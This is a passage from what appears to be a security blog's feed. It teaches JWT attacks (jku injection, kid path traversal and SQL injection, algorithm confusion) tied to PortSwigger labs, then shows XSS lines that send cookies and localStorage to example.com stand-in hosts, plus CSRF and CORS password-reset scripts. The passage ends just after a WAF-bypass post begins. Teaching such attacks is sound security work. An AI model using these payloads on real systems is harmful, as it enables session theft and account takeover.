&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AQAB&amp;#34;&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;kid&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;75d0ef47-af89-47a9-9061-7c02a610d5ab&amp;#34;&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;n&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ&amp;#34;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Change &lt;em&gt;kid&lt;/em&gt; in you cookie with the generated one and &lt;strong&gt;Inject&lt;/strong&gt; &lt;em&gt;jku&lt;/em&gt; in the header the link to the endpoint containing our key :&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;alg&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RS256&amp;#34;&lt;/span&gt;,  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;jku&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://mysite.com/keys.json&amp;#34;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Sign it in Burp &lt;strong&gt;JSON Web Key&lt;/strong&gt; extention&lt;/li&gt;
&lt;li&gt;Send request&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;26---jwt-authentication-bypass-via-kid-header&#34;&gt;2.6 - JWT authentication bypass via kid header&lt;/h3&gt;
&lt;h4 id=&#34;261---path-traversal&#34;&gt;2.6.1 - Path Traversal&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;kid&lt;/code&gt; is an optional header claim which holds a key identifier, particularly useful when you have multiple keys to sign the tokens and you need to look up the right one to verify the signature.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Generate Symetric Key with &lt;code&gt;key = null byte&lt;/code&gt; base64 encoded (AA==)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_19_231603.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Change &lt;em&gt;kid&lt;/em&gt; to &lt;code&gt;/dev/null&lt;/code&gt; which represent Null byte&lt;/li&gt;
&lt;li&gt;Change Body&lt;/li&gt;
&lt;li&gt;Sign with the generated Key&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_19_232035.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;262---sql-injection&#34;&gt;2.6.2 - SQL Injection&lt;/h4&gt;
&lt;p&gt;In a scenario where the content of the &amp;ldquo;kid&amp;rdquo; is used to retreive the password from the database, you could change the payload inside the &amp;ldquo;kid&amp;rdquo; parameter to: &lt;code&gt;non-existent-index&#39; UNION SELECT &#39;ATTACKER&#39;;-- -&lt;/code&gt; and then sign the JWT with the secret key &lt;code&gt;ATTACKER&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&#34;27---jwt-authentication-bypass-via-algorithm-confusion&#34;&gt;2.7 - JWT authentication bypass via algorithm confusion&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/&#34;&gt;https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Get &lt;strong&gt;Public Key&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Get &lt;strong&gt;Public Keys&lt;/strong&gt; from [[#JWKS common locations]]&lt;/li&gt;
&lt;li&gt;or Crack it with &lt;code&gt;jwt_forgery.py&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;or use this :&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;openssl s_client -connect example.com:443 2&amp;gt;&amp;amp;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &amp;lt; /dev/null | sed -n &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/-----BEGIN/,/-----END/p&amp;#39;&lt;/span&gt; &amp;gt; certificatechain.pem 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;openssl x509 -pubkey -in certificatechain.pem -noout &amp;gt; pubkey.pem
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Or we can use this&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 jwt_forgery&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;jwt1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;jwt2&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_20_003929.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;To verify if the public key generated is right :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 jwt_tool&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;V &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;pk &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;jwt_key&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;`&lt;/span&gt; to verify &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; its right
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_20_005548.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;Or you can verify by using the &lt;strong&gt;Tampered x509 JWT&lt;/strong&gt; and sending the request, if you get &lt;em&gt;200&lt;/em&gt; then it&amp;rsquo;s your account and it is the correct X.509 key.  Else repeat the Public key derivation Process.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Copy &lt;strong&gt;Public Key&lt;/strong&gt; with the blank line at the end !!
&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_20_011040.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;PEM&lt;/strong&gt; to &lt;strong&gt;JWK&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Generate RSA key using the &lt;strong&gt;JWK&lt;/strong&gt; we got from &lt;strong&gt;PEM&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Generate New Symetric Key with &lt;strong&gt;base64 Encoded PEM&lt;/strong&gt; in &lt;em&gt;k&lt;/em&gt; value :&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_07_20_012443.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Change &lt;code&gt;alg&lt;/code&gt; parameter to &lt;code&gt;HS256&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Change body as you like&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Sign it using the symetric Key&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Send Request&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key&#34;&gt;JWT authentication bypass via algorithm confusion with no exposed key&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;iii---stealing-jwts&#34;&gt;III - Stealing JWTs&lt;/h2&gt;
&lt;hr&gt;
&lt;p&gt;There&amp;rsquo;s no need to hack JWTs if you can &lt;strong&gt;steal&lt;/strong&gt; and replay them!&lt;/p&gt;
&lt;p&gt;If you have other vulnerabilities in the application you may be able to steal or hijack the tokens of other users.&lt;/p&gt;
&lt;h3 id=&#34;31---xss&#34;&gt;3.1 - XSS&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;document.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://example.com/cookiestealer.php?c=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;document.&lt;span style=&#34;color:#a6e22e&#34;&gt;cookie&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;or&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Image&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://example.com/log.php?localStorage=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;JSON&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;stringify&lt;/span&gt;(window[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;localStorage&amp;#39;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;or&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;document.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://example.com/?password=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;secretPasswordVariable&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;32---csrf&#34;&gt;3.2 - CSRF&lt;/h3&gt;
&lt;p&gt;JWT tokens stored in cookies (whether they are HTTPOnly or not) will be automatically sent by the browser when an authenticated user interacts with the target site. When a victim triggers a CSRF payload the browser will send the associated cookies including the token. The attacker won&amp;rsquo;t be able to see these, but as they are being used to do the attacker&amp;rsquo;s bidding that doesn&amp;rsquo;t really matter.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Example:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;form&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;autosubmit&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;action=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://www.example.com/account/passwordreset&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;enctype=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;text/plain&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;method=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;victim1&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;BadGuyKnowsThis!&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Submit Request&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;document.getElementById(&amp;#34;autosubmit&amp;#34;).submit();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;33---cors-misconfiguration&#34;&gt;3.3 - CORS Misconfiguration&lt;/h3&gt;
&lt;p&gt;When a site&amp;rsquo;s CORS policy allows arbitrary origins as well as sending credentials it is possible to craft an attack page containing an XHR request to the webserver, while also capturing the response.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;This leads to two possible attack paths:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;If the JWT is returned in any HTTP responses from the application, the token can be read by the attacker when the &amp;rsquo;trigger&amp;rsquo; request is sent. A good example of this is a JWT &amp;lsquo;refresh token&amp;rsquo; or queries to an account page or login page.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;If the JWT is sent in a cookie then CORS can be used as a type of CSRF to send the token without the attacker needing to see it.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Example - XHR CORS:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;XMLHttpRequest&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;open&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GET&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://www.avictimwebsitewithJWTcookieauth.com/api/refreshtoken&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;withCredentials&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setRequestHeader&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;application/json;charset=UTF-8&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/script&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Example - XHR CSRF:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;XMLHttpRequest&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;open&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://www.avictimwebsitewithJWTcookieauth.com/api/passwordreset&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;withCredentials&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setRequestHeader&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;application/json;charset=UTF-8&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{&amp;#34;newpass&amp;#34;:&amp;#34;BadGuyKnowsThis!&amp;#34;}&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/script&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;34---man-in-the-middle&#34;&gt;3.4 - Man-in-the-Middle&lt;/h3&gt;
&lt;p&gt;JWTs may also be seen in captured HTTP traffic, either in the header/body of unencrypted traffic, in log files of firewalls/gateways/other servers, in referrer links (if exposed as a URL parameter), or a range of other places.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Bypassing WAFs</title>
      <link>https://flowhero.github.io/newblog/posts/bypassing-wafs/</link>
      <pubDate>Sat, 05 Aug 2023 00:15:21 +0100</pubDate>
      
      <guid>https://flowhero.github.io/newblog/posts/bypassing-wafs/</guid>
      <description>I - Toolkits nmap http-waf-detect wafw00f ffuf wfuzz IP Rotate Burp Extension II - Detecting WAF We get detected by : IP address, origin headers, authorization tokens, and metadata. Metadata is information extrapo-lated by the API defenders, such as patterns of requests, the rate of request,and the combination of the headers included in requests.
Instead of the attack-first, ask-questions-later approach, I recommend you first use the API as it was intended.</description>
      <content>&lt;h2 id=&#34;i---toolkits&#34;&gt;I - Toolkits&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;nmap&lt;/code&gt;  http-waf-detect&lt;/li&gt;
&lt;li&gt;&lt;code&gt;wafw00f&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ffuf&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;wfuzz&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IP Rotate&lt;/code&gt; Burp Extension&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ii---detecting-waf&#34;&gt;II - Detecting WAF&lt;/h2&gt;
&lt;p&gt;We get detected by :
&lt;em&gt;IP address&lt;/em&gt;, &lt;em&gt;origin&lt;/em&gt; &lt;strong&gt;headers&lt;/strong&gt;, &lt;em&gt;authorization tokens&lt;/em&gt;, and &lt;em&gt;metadata&lt;/em&gt;. Metadata is information extrapo-lated by the API defenders, such as patterns of requests, the rate of request,and the combination of the headers included in requests.&lt;/p&gt;
&lt;blockquote&gt;
